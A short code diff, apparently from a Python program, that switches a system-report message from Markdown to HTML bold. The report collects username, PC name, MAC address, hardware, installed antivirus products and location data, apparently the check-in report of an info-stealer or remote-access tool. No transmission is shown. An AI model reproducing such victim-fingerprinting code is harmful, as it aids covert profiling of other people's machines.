@@ -249,7 +249,7 @@ Antiviruses: {', '.join(Antiviruses)}
         Log(f"SystemInfo ---> {e}")
     
     msgdata=f"""
-**🖥System🖥**
+<b>🖥System🖥</b>
 ⏲Time: {time.asctime()}
 {timezone}{city}{country}👤Username: {os.getlogin()}
 👤PC Name: {uname.node}
@@ -258,13 +258,13 @@ Antiviruses: {', '.join(Antiviruses)}
 📋MAC Address: {get_mac_address()} 
 
 
-**🖥Hardware🖥**
+<b>🖥Hardware🖥</b>
 🔧CPU: {cpu}
 🔧RAM: {get_size(svmem.total)}
 🔧GPU: {', '.join(list_gpus)}
 🛡Antiviruses: {', '.join(Antiviruses)}
 
 
-**📡Network📡**{ip_info_msg}
+<b>📡Network📡</b>{ip_info_msg}
 """
     return msgdata
